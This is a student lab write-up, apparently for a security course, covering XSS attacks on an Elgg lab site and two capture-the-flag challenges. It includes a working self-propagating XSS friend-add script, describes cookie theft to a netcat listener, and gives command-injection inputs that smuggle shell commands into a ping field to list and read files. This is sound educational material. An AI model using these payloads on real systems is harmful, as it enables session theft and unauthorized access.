## Week 10 - Cross-Site Scripting Lab

## Task 1 - Posting a Malicious Message to Display an Alert Window

For this handout, we have to start by embeding a JavaScript program in our Elgg profile, such that when another
user views our profile, the JavaScript program will be executed and an alert window will be displayed. The JavaScript program that will display is:

![Terminal print javascriptcode](/images/logbook10/javascriptcode.png)

Embeding that code to the brief description field of, for example, Alice´s profile. We get this pop-up:

![Terminal print Xsspop_up](/images/logbook10/Xsspop_up.png)

## Task 2 - Posting a Malicious Message to Display Cookies

For this task, we have to embed a JavaScript program in a profile, such that when the user viewed their own profile, an alert window would appear with the user's cookies. For that we changed the code inserted in the brief description to:

![Terminal print cookies_code](/images/logbook10/cookies_code.png)

Coming back to Alice profile, going back to the brief description field on the edit profile page, we put that code. Now every person that visits Alice´s profile gets a message with cookies, like this one:

![Terminal print cookies_popup](/images/logbook10/cookies_popup.png)

## Task 3 - Stealing Cookies from the Victim's Machine

Let´s get spicy! Now we want to send cookies to another profile using JavaScript code. This time, Alice is the attacker and she wants to be able to see other's cookies. For that, we changed the code in the brief description to:

![Terminal print show_cookies](/images/logbook10/show_cookies.png)

With the netcat command, we can print out whatever is sent by the client. So in this case, Alice will be able to get the cookies from Boby, getting this results:

![Terminal print netcat](/images/logbook10/netcat.png)

## Task 4 - Becoming the Victim's Friend

For this task, we want to make Samy friends with every user that visits Samy´s page. For that, we will write a XSS worm.
First lets check how we add a friend.

![Terminal print friendrequest](/images/logbook10/friendrequest.png)

To test, we added Boby as an Alice´s friend. We can see that the friend id, the variables __elgg_ts and __elgg_token and the cookies were sent to the server in every friend request.

Now lets go to Samy´s account.
In the 'About me' field, we add this JavaScript program:

```
<script type="text/javascript">
window.onload = function () {
  var Ajax=null;

  var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
  var token="&__elgg_token="+elgg.security.token.__elgg_token;

  //Construct the HTTP request to add Samy as a friend.
  var sendurl= "http://www.seed-server.com/action/friends/add" + "?friend=59" + token + ts;
 
  //Create and send Ajax request to add friend
  Ajax=new XMLHttpRequest();
  Ajax.open("GET", sendurl, true);
  Ajax.send();
}
</script>
```

This program send a HTTP request to add a friend. After that, we can see that Samy has friends by only seeing his profile.

![Terminal print samyfriends](/images/logbook10/samyfriends.png)

Question 1: Explain the purpose of Lines ➀ and ➁, why are they are needed?
    This line are needed because they will get us the values of __elgg_ts and __elgg_token variables. We use this values against Cross    Site Request Forgery attacks. Because there values change every time a page is loaded, we need to acess them every time. 

Question 2: If the Elgg application only provide the Editor mode for the "About Me" field, i.e., you cannot switch to the Text mode, can you still launch a successful attack?
    It would not be possible to have success with this attack because this mode adds extra HTML and some symbols change.



## CTF Challenges

### Challenge 1 

For this challenge, we found out that the website is vulnerable to XSS scripts, because after typing something in the text box, we are sent to a page where the admin can give the flag and mark the request as read. These buttons are only enabled to the admin, but we could enable them by inspecting element tool and changing disabled to enabled, so our purpose was to make the admin click the button Give Flag for us. For that, we 
typed the following code on the text box: 


![ctf](/images/logbook10/ctf1.png)

When the admin goes to evaluate the request, the script will click the button, and as it will be enabled, the flag will be given to us.
We used "giveflag" on the script because if we inspect the text box we get this id.

![ctf11](/images/ctf12.png)

Then, after waiting for a while, we got the flag 

![ctf1](/images/logbook10/ctf11.png)

### Challenge 2 

For this challenge, we have a black-boxed window.

We tried to ping google server by typing 8.8.8.8 and saw that this server was probably using a bash to run the unix command ping, so then we tried: 

```
; ls / -la 
```

The ; symbol was used at the beggining in order to add a command. And we got a list of all content including a folder called flags

![ctf2](/images/logbook10/ctf21.png)

Then, by using: 
```
; ls /flags
```
We were able to see the content inside, the flag.txt file.

![ctf22](/images/logbook10/ctf22.png)

All that was left was to display the content that was inside the flag.txt file by using the cat command
```
; cat flags/flag.txt
```

And voilá! We got the flags.

![ctf23](/images/logbook10/ctf25.png)
